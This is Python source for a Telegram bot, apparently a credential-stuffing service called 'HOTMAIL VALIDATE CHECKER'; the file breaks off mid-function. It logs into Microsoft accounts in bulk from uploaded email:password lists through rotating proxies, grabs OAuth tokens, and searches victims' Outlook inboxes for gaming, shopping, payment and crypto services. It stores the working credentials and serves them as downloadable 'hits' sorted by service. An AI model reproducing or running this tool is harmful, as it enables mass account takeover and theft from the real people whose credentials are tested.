#!/usr/bin/env python3
"""
HOTMAIL VALIDATE CHECKER — Telegram Bot
Developer: @TheTalha47
Lywax-style · Inbox keyword counts · Live scan · Service hits · Admin limits
"""

import os
import re
import sys
import time
import uuid
import asyncio
import sqlite3
import logging
import warnings
import threading
from datetime import datetime, date
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs
from typing import Optional, List, Dict, Set

import requests
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters, ConversationHandler
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger("hmbot")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS: Set[int] = set()
_admin_env = os.environ.get("ADMIN_IDS", "")
if _admin_env.strip():
    for x in _admin_env.split(","):
        x = x.strip()
        if x.isdigit():
            ADMIN_IDS.add(int(x))

DAILY_LIMIT_DEFAULT = int(os.environ.get("DAILY_LIMIT", "5000"))
DEFAULT_THREADS = int(os.environ.get("DEFAULT_THREADS", "60"))
DB_PATH = os.environ.get("DB_PATH", "hmbot.db")
MAX_PARALLEL = int(os.environ.get("MAX_PARALLEL", "2"))

ALL_KEYWORDS = [
    "Steam", "Epic Games", "Origin (EA)", "Ubisoft", "Battle.net", "GOG",
    "Roblox", "Minecraft", "PUBG / Krafton", "Riot Games", "Supercell",
    "Rockstar Games", "Activision / Call of Duty", "Garena / Free Fire",
    "Konami ID", "eFootball (PES)", "Xbox Live", "PlayStation", "Nintendo",
    "Amazon", "eBay", "AliExpress", "Etsy", "Walmart", "Target", "Best Buy",
    "Shein", "Wish", "Zalando", "Trendyol", "Hepsiburada", "N11",
    "Netflix", "Spotify", "YouTube", "Amazon Prime", "Disney+", "Hulu",
    "Apple Music", "Twitch", "HBO", "Paramount",
    "Facebook", "Instagram", "Twitter (X)", "LinkedIn", "TikTok", "Snapchat",
    "Discord", "Telegram", "WhatsApp", "Zoom", "Skype",
    "Google", "Google Drive", "Gmail", "Apple", "iCloud", "Microsoft",
    "OpenAI / ChatGPT", "Anthropic", "Adobe", "Dropbox", "Canva",
    "PayPal", "Uber", "Airbnb", "Binance", "Coinbase", "Cash App",
    "Venmo", "Stripe", "Shopify",
]

WAIT_COMBOS, WAIT_PROXIES, WAIT_THREADS, WAIT_LIMIT_UID, WAIT_LIMIT_VAL, WAIT_CUSTOM_UID = range(6)

def db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = db()
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        daily_limit INTEGER DEFAULT 5000, custom_kw INTEGER DEFAULT 0, created_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS daily_usage (
        user_id INTEGER, day TEXT, lines_used INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, day))""")
    c.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, password TEXT,
        status TEXT, country TEXT, keywords TEXT, services TEXT, created_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS proxies (id INTEGER PRIMARY KEY AUTOINCREMENT, proxy TEXT UNIQUE)""")
    c.execute("""CREATE TABLE IF NOT EXISTS user_keywords (user_id INTEGER, word TEXT, PRIMARY KEY (user_id, word))""")
    if not c.execute("SELECT 1 FROM settings WHERE key='threads'").fetchone():
        c.execute("INSERT INTO settings (key,value) VALUES ('threads',?)", (str(DEFAULT_THREADS),))
    conn.commit()
    conn.close()

init_db()

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def ensure_user(uid: int, username: str = "", first_name: str = ""):
    conn = db()
    conn.execute(
        """INSERT OR IGNORE INTO users (user_id, username, first_name, daily_limit, custom_kw, created_at)
           VALUES (?,?,?,?,0,?)""",
        (uid, username or "", first_name or "", DAILY_LIMIT_DEFAULT, datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()

def get_user(uid: int):
    conn = db()
    row = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    conn.close()
    return row

def get_daily_used(uid: int) -> int:
    today = date.today().isoformat()
    conn = db()
    row = conn.execute("SELECT lines_used FROM daily_usage WHERE user_id=? AND day=?", (uid, today)).fetchone()
    conn.close()
    return row["lines_used"] if row else 0

def add_daily_used(uid: int, n: int):
    today = date.today().isoformat()
    conn = db()
    conn.execute(
        """INSERT INTO daily_usage (user_id, day, lines_used) VALUES (?,?,?)
           ON CONFLICT(user_id, day) DO UPDATE SET lines_used = lines_used + ?""",
        (uid, today, n, n)
    )
    conn.commit()
    conn.close()

def user_limit(uid: int) -> int:
    if is_admin(uid):
        return 10**9
    u = get_user(uid)
    return int(u["daily_limit"]) if u else DAILY_LIMIT_DEFAULT

def set_user_limit(uid: int, limit: int):
    conn = db()
    conn.execute("UPDATE users SET daily_limit=? WHERE user_id=?", (limit, uid))
    conn.commit()
    conn.close()

def set_custom_kw(uid: int, enabled: bool):
    conn = db()
    conn.execute("UPDATE users SET custom_kw=? WHERE user_id=?", (1 if enabled else 0, uid))
    conn.commit()
    conn.close()

def has_custom_kw(uid: int) -> bool:
    if is_admin(uid):
        return True
    u = get_user(uid)
    return bool(u and u["custom_kw"])

def get_setting(key: str, default: str = "") -> str:
    conn = db()
    row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    conn.close()
    return row["value"] if row else default

def set_setting(key: str, value: str):
    conn = db()
    conn.execute(
        "INSERT INTO settings (key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
        (key, value)
    )
    conn.commit()
    conn.close()

def get_proxies() -> List[str]:
    conn = db()
    rows = conn.execute("SELECT proxy FROM proxies").fetchall()
    conn.close()
    return [r["proxy"] for r in rows]

def get_user_keywords(uid: int) -> List[str]:
    conn = db()
    rows = conn.execute("SELECT word FROM user_keywords WHERE user_id=?", (uid,)).fetchall()
    conn.close()
    if rows:
        return [r["word"] for r in rows]
    return list(ALL_KEYWORDS)

def set_user_keywords(uid: int, words: List[str]):
    conn = db()
    conn.execute("DELETE FROM user_keywords WHERE user_id=?", (uid,))
    for w in words:
        conn.execute("INSERT OR IGNORE INTO user_keywords (user_id, word) VALUES (?,?)", (uid, w))
    conn.commit()
    conn.close()

def toggle_user_keyword(uid: int, word: str):
    current = set(get_user_keywords(uid))
    if word in current:
        current.discard(word)
    else:
        current.add(word)
    set_user_keywords(uid, list(current))

def save_hit(uid: int, email: str, password: str, status: str, country: str = None,
             keywords: str = "", services: str = ""):
    conn = db()
    conn.execute(
        """INSERT INTO hits (user_id, email, password, status, country, keywords, services, created_at)
           VALUES (?,?,?,?,?,?,?,?)""",
        (uid, email, password, status, country, keywords, services, datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()

def user_hits(uid: int, service: str = None, limit: int = 2000):
    conn = db()
    if service and service not in ("ALL", "NORMAL"):
        rows = conn.execute(
            """SELECT * FROM hits WHERE user_id=? AND status='valid'
               AND (services LIKE ? OR keywords LIKE ?) ORDER BY id DESC LIMIT ?""",
            (uid, f"%{service}%", f"%{service}%", limit)
        ).fetchall()
    elif service == "NORMAL":
        rows = conn.execute(
            """SELECT * FROM hits WHERE user_id=? AND status='valid'
               AND (services IS NULL OR services='' OR services='[]') ORDER BY id DESC LIMIT ?""",
            (uid, limit)
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT * FROM hits WHERE user_id=? AND status='valid' ORDER BY id DESC LIMIT ?",
            (uid, limit)
        ).fetchall()
    conn.close()
    return rows

def user_hit_stats(uid: int) -> Dict[str, int]:
    conn = db()
    rows = conn.execute("SELECT services FROM hits WHERE user_id=? AND status='valid'", (uid,)).fetchall()
    conn.close()
    counts: Dict[str, int] = {}
    normal = 0
    for r in rows:
        s = (r["services"] or "").strip()
        if not s or s == "[]":
            normal += 1
            continue
        for part in s.split(","):
            part = part.strip()
            if not part:
                continue
            name = part.split(":")[0].strip()
            counts[name] = counts.get(name, 0) + 1
    if normal:
        counts["Normal Accounts"] = normal
    counts["ALL"] = sum(counts.values()) if counts else 0
    return counts

def count_all_hits() -> int:
    conn = db()
    n = conn.execute("SELECT COUNT(*) AS c FROM hits").fetchone()["c"]
    conn.close()
    return n

def fetch_all_hits():
    conn = db()
    rows = conn.execute("SELECT * FROM hits ORDER BY id").fetchall()
    conn.close()
    return rows

def clear_all_hits():
    conn = db()
    conn.execute("DELETE FROM hits")
    conn.commit()
    conn.close()

def clear_user_hits(uid: int):
    conn = db()
    conn.execute("DELETE FROM hits WHERE user_id=?", (uid,))
    conn.commit()
    conn.close()

class HotmailChecker:
    def __init__(self, email: str, password: str, proxy: Optional[str] = None, keywords: Optional[List[str]] = None):
        self.email = email.strip()
        self.password = password.strip()
        self.proxy = proxy
        self.keywords = keywords or ALL_KEYWORDS[:40]
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
        })
        self.access_token = None

    def _get_sft(self):
        url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )
        for _ in range(3):
            try:
                r = self.session.get(url, timeout=12)
                text = r.text
                m = (
                    re.search(r'value=\\"(.+?)\\"', text)
                    or re.search(r'value="(.+?)"', text)
                    or re.search(r"sFTTag:'(.+?)'", text)
                    or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
                )
                if not m:
                    continue
                sft = m.group(1)
                m2 = (
                    re.search(r'"urlPost":"(.+?)"', text)
                    or re.search(r"urlPost:'(.+?)'", text)
                    or re.search(r'<form.*?action="(.+?)"', text, re.S)
                )
                if m2:
                    return m2.group(1).replace("&amp;", "&"), sft
            except Exception:
                time.sleep(0.25)
        return None, None

    def _grab_token(self):
        for scope in ("service::outlook.office.com::MBI_SSL", "service::user.auth.xboxlive.com::MBI_SSL"):
            try:
                url = (
                    "https://login.live.com/oauth20_authorize.srf"
                    f"?client_id=00000000402B5328&response_type=token&scope={scope}"
                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none"
                )
                r = self.session.get(url, timeout=10, allow_redirects=True)
                if "access_token" in r.url:
                    frag = parse_qs(urlparse(r.url).fragment)
                    tok = frag.get("access_token", [None])[0]
                    if tok:
                        self.access_token = tok
                        return tok
            except Exception:
                continue
        return None

    def search_inbox(self):
        found = {}
        total = 0
        if not self.access_token:
            self._grab_token()
        if not self.access_token:
            return found, 0
        headers = {
            "Authorization": f"Bearer {self.access_token}",
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
        }
        url = "https://outlook.live.com/search/api/v2/query"
        for kw in self.keywords[:50]:
            try:
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {
                            "Or": [
                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                            ]
                        },
                        "From": 0,
                        "Query": {"QueryString": kw},
                        "Size": 25,
                        "EnableTopResults": True,
                        "TopResultsCount": 3,
                    }],
                }
                r = self.session.post(url, json=payload, headers=headers, timeout=10)
                if r.status_code != 200:
                    continue
                data = r.json()
                cnt = 0
                for es in data.get("EntitySets") or []:
                    for rs in es.get("ResultSets") or []:
                        if "Total" in rs:
                            cnt = int(rs["Total"] or 0)
                        elif "Results" in rs:
                            cnt = len(rs["Results"] or [])
                if cnt > 0:
                    found[kw] = cnt
                    total += cnt
            except Exception:
                continue
        return found, total

    def login(self) -> dict:
        result = {"status": "error", "country": None, "keywords": {}, "inbox_total": 0}
        try:
            url_post, sft = self._get_sft()
            if not url_post or not sft:
                return result
            data = {"login": self.email, "loginfmt": self.email, "passwd": self.password, "PPFT": sft}
            r = self.session.post(
                url_post, data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                allow_redirects=True, timeout=15
            )
            text = r.text.lower()
            final = r.url
            if "#" in final and "access_token" in final:
                result["status"] = "valid"
                frag = parse_qs(urlparse(final).fragment)
                self.access_token = frag.get("access_token", [None])[0]
            elif "cancel?mkt=" in r.text or "consent" in text:
                result["status"] = "valid"
            elif "your account or password is incorrect" in text or "doesn't exist" in text:
                result["status"] = "invalid"
            elif any(x in text for x in ("help us protect", "two-step", "identity/confirm", "2fa")):
                result["status"] = "2fa"
            elif any(x in text for x in ("locked", "abuse", "suspicious", "recover?")):
                result["status"] = "locked"
            else:
                try:
                    auth = (
                        "https://login.live.com/oauth20_authorize.srf"
                        "?client_id=00000000402B5328&response_type=token"
                        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                        "&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none"
                    )
                    r2 = self.session.get(auth, timeout=10, allow_redirects=True)
                    if "access_token" in r2.url:
                        result["status"] = "valid"
                        frag = parse_qs(urlparse(r2.url).fragment)
                        self.access_token = frag.get("access_token", [None])[0]
                    else:
                        result["status"] = "invalid"
                except Exception:
                    result["status"] = "error"
            if result["status"] == "valid":
                m = re.search(r'"Country":"([A-Z]{2})"', r.text)
                if m:
                    result["country"] = m.group(1)
                kw_map, total = self.search_inbox()
                result["keywords"] = kw_map
                result["inbox_total"] = total
        except Exception:
            result["status"] = "error"
        return result

job_lock = threading.Lock()
active_jobs: Dict[int, dict] = {}
queue_list: List[dict] = []
running_count = 0

def run_job(uid: int, combos: List[str], proxies: List[str], threads: int,
            keywords: List[str], chat_id: int, status_msg_id: int = None):
    global running_count
    stats = {
        "total": len(combos), "checked": 0, "valid": 0, "normal": 0,
        "2fa": 0, "bad": 0, "errors": 0, "running": True,
        "hits": [], "last_hits": [], "start": time.time()
    }
    with job_lock:
        active_jobs[uid] = stats
        running_count += 1
    pidx = 0
    def next_proxy():
        nonlocal pidx
        if not proxies:
            return None
        p = proxies[pidx % len(proxies)]
        pidx += 1
        return p
    def worker(line: str):
        line = line.strip()
        if ":" not in line:
            return
        email, password = line.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            return
        res = HotmailChecker(email, password, proxy=next_proxy(), keywords=keywords).login()
        st = res["status"]
        with job_lock:
            stats["checked"] += 1
            if st == "valid":
                stats["valid"] += 1
                kw_map = res.get("keywords") or {}
                if isinstance(kw_map, dict) and kw_map:
                    parts = [f"{k}:{v}" for k, v in kw_map.items()]
                    kw_str = " | ".join(parts)
                    services = ",".join(kw_map.keys())
                    line_out = f"{email}:{password} | {kw_str}"
                    stats["hits"].append(line_out)
                    stats["last_hits"] = (stats["last_hits"] + [line_out])[-3:]
                    save_hit(uid, email, password, "valid", res.get("country"), ",".join(parts), services)
                else:
                    stats["normal"] += 1
                    line_out = f"{email}:{password} | VALID"
                    stats["hits"].append(line_out)
                    save_hit(uid, email, password, "valid", res.get("country"), "", "")
            elif st == "2fa":
                stats["2fa"] += 1
                save_hit(uid, email, password, "2fa")
            elif st == "invalid":
                stats["bad"] += 1
            else:
                stats["errors"] += 1
    with ThreadPoolExecutor(max_workers=max(1, min(threads, 120))) as ex:
        futs = [ex.submit(worker, l) for l in combos]
        for _ in as_completed(futs):
            pass
    with job_lock:
        stats["running"] = False
        running_count = max(0, running_count - 1)
    try:
        elapsed = int(time.time() - stats["start"])
        text = (
            f"✅ Check finished\\nChecked: {stats['checked']}\\n"
            f"HIT: {stats['valid'] - stats['normal']} · Normal: {stats['normal']}\\n"
            f"2FA: {stats['2fa']} · Bad: {stats['bad']} · Err: {stats['errors']}\\nTime: {elapsed}s"
        )
        token = BOT_TOKEN
        if stats["hits"]:
            path = f"/tmp/hits_{uid}_{int(time.time())}.txt"
            with open(path, "w", encoding="utf-8") as f:
                f.write("Hotmail checked by HOTMAIL VALIDATE CHECKER | @TheTalha47\\n")
                f.write("=" * 60 + "\\n")
                f.write("\\n".join(stats["hits"]))
                f.write("\\n" + "=" * 60 + "\\n")
            with open(path, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{token}/sendDocument",
                    data={"chat_id": chat_id, "caption": text.replace("\\\\n", "\\n")},
                    files={"document": f}, timeout=30,
                )
        else:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": text.replace("\\\\n", "\\n")}, timeout=15,
            )
    except Exception as e:
        log.warning("notify fail: %s", e)
    process_queue()

def process_queue():
    global running_count
    with job_lock:
        if running_count >= MAX_PARALLEL or not queue_list:
            return
        job = queue_list.pop(0)
    t = threading.Thread(
        target=run_job,
        args=(job["uid"], job["combos"], job["proxies"], job["threads"],
              job["keywords"], job["chat_id"], job.get("msg_id")),
        daemon=True
    )
    t.start()

def main_kb(uid: int):
    rows = [
        [InlineKeyboardButton("🚀 Start", callback_data="start_check")],
        [InlineKeyboardButton("🔑 Keywords", callback_data="kw_menu:0"),
         InlineKeyboardButton("⚡ Speed", callback_data="speed_info")],
        [InlineKeyboardButton("📊 My Hits", callback_data="my_hits"),
         InlineKeyboardButton("📈 Status", callback_data="status")],
        [InlineKeyboardButton("👤 My Profile", callback_data="profile")],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

def kw_kb(uid: int, page: int = 0):
    selected = set(get_user_keywords(uid))
    per = 16
    total_pages = max(1, (len(ALL_KEYWORDS) + per - 1) // per)
    page = max(0, min(page, total_pages - 1))
    chunk = ALL_KEYWORDS[page * per:(page + 1) * per]
    rows = []
    row = []
    for w in chunk:
        mark = "✅" if w in selected else "⬜"
        row.append(InlineKeyboardButton(f"{mark} {w}", callback_data=f"kw_tog:{w}:{page}"))
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀", callback_data=f"kw_menu:{page-1}"))
    nav.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("▶", callback_data=f"kw_menu:{page+1}"))
    rows.append(nav)
    rows.append([
        InlineKeyboardButton("✅ Select All", callback_data=f"kw_all:{page}"),
        InlineKeyboardButton("❌ Deselect", callback_data=f"kw_none:{page}"),
    ])
    rows.append([InlineKeyboardButton("« Back", callback_data="home")])
    return InlineKeyboardMarkup(rows)

def hits_kb(uid: int, page: int = 0):
    stats = user_hit_stats(uid)
    total = stats.get("ALL", 0)
    services = [(k, v) for k, v in stats.items() if k != "ALL"]
    services.sort(key=lambda x: -x[1])
    per = 12
    total_pages = max(1, (len(services) + per - 1) // per)
    page = max(0, min(page, total_pages - 1))
    chunk = services[page * per:(page + 1) * per]
    rows = [[InlineKeyboardButton(f"📦 All ({total} HITs)", callback_data="hit_dl:ALL")]]
    if stats.get("Normal Accounts"):
        rows.append([InlineKeyboardButton(
            f"🔑 Normal Accounts ({stats['Normal Accounts']})", callback_data="hit_dl:NORMAL")])
    row = []
    for name, cnt in chunk:
        if name == "Normal Accounts":
            continue
        row.append(InlineKeyboardButton(f"{name[:18]} ({cnt})", callback_data=f"hit_dl:{name}"))
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀", callback_data=f"hits_page:{page-1}"))
    nav.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("▶", callback_data=f"hits_page:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([
        InlineKeyboardButton("📥 Download All", callback_data="hit_dl:ALL"),
        InlineKeyboardButton("🗑 Delete All", callback_data="hit_del"),
    ])
    rows.append([InlineKeyboardButton("« Back", callback_data="home")])
    return InlineKeyboardMarkup(rows)

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 Download All Hits + Clear", callback_data="adm_dl")],
        [InlineKeyboardButton("🧵 Set Threads", callback_data="adm_threads"),
         InlineKeyboardButton("🌐 Proxies", callback_data="adm_proxies")],
        [InlineKeyboardButton("📈 Set User Limit", callback_data="adm_limit"),
         InlineKeyboardButton("🔓 Grant Custom KW", callback_data="adm_custom")],
        [InlineKeyboardButton("🗑 Clear Proxies", callback_data="adm_clr_proxy")],
        [InlineKeyboardButton("📊 Bot Stats", callback_data="adm_stats")],
        [InlineKeyboardButton("« Back", callback_data="home")],
    ])

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    ensure_user(u.id, u.username or "", u.first_name or "")
    used = get_daily_used(u.id)
    lim = user_limit(u.id)
    left = max(0, lim - used) if not is_admin(u.id) else "∞"
    kw_count = len(get_user_keywords(u.id))
    text = (
        f"🔒 *HOTMAIL VALIDATE CHECKER*\\n"
        f"Developer: @TheTalha47\\n\\n"
        f"🎯 Keywords: `{kw_count}`\\n"
        f"🔄 Parallel: `{running_count}/{MAX_PARALLEL}`\\n"
        f"📋 Queue: `{len(queue_list)}`\\n\\n"
        f"📋 Usage:\\n1. Keywords → Select\\n2. Speed → check\\n3. Start → Send File\\n\\n"
        f"Daily: `{used}` / `{lim if not is_admin(u.id) else '∞'}` · left `{left}`"
    )
    await update.message.reply_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=main_kb(u.id))

async def cb_home(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    used = get_daily_used(u.id)
    lim = user_limit(u.id)
    left = max(0, lim - used) if not is_admin(u.id) else "∞"
    text = (
        f"🔒 *HOTMAIL VALIDATE CHECKER*\\n@TheTalha47\\n\\n"
        f"🎯 Keywords: `{len(get_user_keywords(u.id))}`\\n"
        f"Daily: `{used}` / `{lim if not is_admin(u.id) else '∞'}` · left `{left}`"
    )
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=main_kb(u.id))

async def cb_noop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()

async def cb_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    used = get_daily_used(u.id)
    lim = user_limit(u.id)
    custom = "Yes" if has_custom_kw(u.id) else "No (admin only)"
    text = (
        f"👤 *Profile*\\nID: `{u.id}`\\nDaily limit: `{lim if not is_admin(u.id) else '∞'}`\\n"
        f"Used today: `{used}`\\nCustom keywords: `{custom}`\\n"
        f"Selected KW: `{len(get_user_keywords(u.id))}`"
    )
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=main_kb(u.id))

async def cb_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    thr = get_setting("threads", str(DEFAULT_THREADS))
    px = len(get_proxies())
    text = f"⚡ *Speed*\\nThreads: `{thr}`\\nProxies: `{px}`\\nMax parallel: `{MAX_PARALLEL}`"
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=main_kb(q.from_user.id))

async def cb_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    job = active_jobs.get(uid)
    if not job or not job.get("running"):
        text = f"Idle\\nQueue: `{len(queue_list)}` · Running: `{running_count}`"
    else:
        elapsed = int(time.time() - job["start"])
        cpm = int(job["checked"] / max(elapsed / 60, 0.01))
        last = "\\n".join(job.get("last_hits") or []) or "—"
        text = (
            f"🔄 *SCANNING*\\n`{job['checked']}` / `{job['total']}` · `{cpm}`/min · `{elapsed}`s\\n\\n"
            f"✅ HIT: `{job['valid'] - job['normal']}`\\n🔑 Normal: `{job['normal']}`\\n"
            f"❌ BAD: `{job['bad']}`\\n🔐 2FA: `{job['2fa']}`\\n⚠ ERROR: `{job['errors']}`\\n\\n"
            f"Last HITs:\\n`{last}`"
        )
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=main_kb(uid))

async def cb_kw_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    page = int(q.data.split(":")[1])
    sel = len(get_user_keywords(q.from_user.id))
    text = f"🔑 *Keywords* · Page {page+1}\\nSelected: `{sel}` / `{len(ALL_KEYWORDS)}`\\nSelect all → Deep Scan"
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=kw_kb(q.from_user.id, page))

async def cb_kw_tog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    parts = q.data.split(":", 2)
    word, page = parts[1], int(parts[2])
    if word not in ALL_KEYWORDS and not has_custom_kw(q.from_user.id):
        await q.answer("Custom keywords locked — admin only", show_alert=True)
        return
    toggle_user_keyword(q.from_user.id, word)
    await q.answer()
    sel = len(get_user_keywords(q.from_user.id))
    text = f"🔑 *Keywords* · Page {page+1}\\nSelected: `{sel}` / `{len(ALL_KEYWORDS)}`"
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=kw_kb(q.from_user.id, page))

async def cb_kw_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    page = int(q.data.split(":")[1])
    set_user_keywords(q.from_user.id, list(ALL_KEYWORDS))
    text = f"🔑 All selected · `{len(ALL_KEYWORDS)}`"
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kw_kb(q.from_user.id, page))

async def cb_kw_none(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    page = int(q.data.split(":")[1])
    set_user_keywords(q.from_user.id, [])
    await q.edit_message_text("🔑 None selected", reply_markup=kw_kb(q.from_user.id, page))

async def cb_my_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    stats = user_hit_stats(q.from_user.id)
    text = f"🎯 *My Hits*\\nTotal HITs: `{stats.get('ALL', 0)}`\\nServices: `{max(0,len(stats)-1)}`\\nView by service:"
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=hits_kb(q.from_user.id, 0))

async def cb_hits_page(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    page = int(q.data.split(":")[1])
    stats = user_hit_stats(q.from_user.id)
    text = f"🎯 *My Hits* · `{stats.get('ALL', 0)}` total"
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=hits_kb(q.from_user.id, page))

async def cb_hit_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    service = q.data.split(":", 1)[1]
    rows = user_hits(q.from_user.id, service if service != "ALL" else None)
    if not rows:
        await q.answer("No hits", show_alert=True)
        return
    lines = []
    for r in rows:
        if r["keywords"]:
            lines.append(f"{r['email']}:{r['password']} | {r['keywords'].replace(',', ' | ')}")
        else:
            lines.append(f"{r['email']}:{r['password']} | VALID")
    path = f"/tmp/hits_{q.from_user.id}_{service[:12]}_{int(time.time())}.txt"
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"HOTMAIL VALIDATE CHECKER | @TheTalha47 | {service}\\n")
        f.write("=" * 50 + "\\n")
        f.write("\\n".join(lines))
    await context.bot.send_document(
        chat_id=q.message.chat_id, document=InputFile(path),
        caption=f"{service}: {len(lines)} hits"
    )

async def cb_hit_del(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    clear_user_hits(q.from_user.id)
    await q.edit_message_text("Hits deleted.", reply_markup=main_kb(q.from_user.id))

async def cb_start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if active_jobs.get(uid, {}).get("running"):
        await q.edit_message_text("Already running.", reply_markup=main_kb(uid))
        return
    used = get_daily_used(uid)
    lim = user_limit(uid)
    left = max(0, lim - used) if not is_admin(uid) else 10**9
    if left <= 0:
        await q.edit_message_text(f"Daily limit reached (`{lim}`).", parse_mode="Markdown", reply_markup=main_kb(uid))
        return
    context.user_data["await"] = "combos"
    await q.edit_message_text(
        f"✅ *Ready!*\\n\\n📁 Send file: `email:password`\\n"
        f"📊 Max `{min(left, 5000) if not is_admin(uid) else left}` accounts\\n"
        f"📦 Max 5MB\\n⏳ Queue: Active",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="home")]])
    )
    return WAIT_COMBOS

async def recv_combos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "combos":
        return
    uid = update.effective_user.id
    text = ""
    if update.message.document:
        f = await update.message.document.get_file()
        data = await f.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    elif update.message.text:
        text = update.message.text
    else:
        await update.message.reply_text("Send text or .txt")
        return WAIT_COMBOS
